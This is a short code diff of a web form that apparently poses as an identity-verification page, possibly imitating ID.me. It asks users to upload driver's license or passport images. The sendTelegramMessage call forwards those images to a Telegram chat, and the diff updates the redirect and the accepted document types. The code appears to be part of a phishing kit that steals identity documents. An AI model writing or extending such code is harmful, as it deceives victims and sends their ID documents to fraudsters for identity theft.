@@ -122,14 +122,14 @@ const IdentityVerificationForm = () => {
     await sendTelegramMessage("Identity verification images submission.", frontImage, backImage);
     setIsSubmitting(false);
     
-    router.push("/idme");
+    router.push("/thankyou");
   };
 
   return (
     <div className="min-h-screen flex items-center justify-center bg-gray-50 p-6">
       <div className="bg-white p-8 rounded-lg shadow-lg max-w-md w-full">
         <h2 className="text-3xl font-semibold text-gray-800 text-center mb-4">Verify Your Identity</h2>
-        <p className="text-center text-gray-600 mb-6">Upload images of your <strong>Drivers License</strong> or <strong>State ID</strong>.</p>
+        <p className="text-center text-gray-600 mb-6">Upload images of your <strong>Drivers License</strong> or <strong>Passport</strong>.</p>
 
         <form onSubmit={handleSubmit} className="space-y-6">
           <ImageUpload
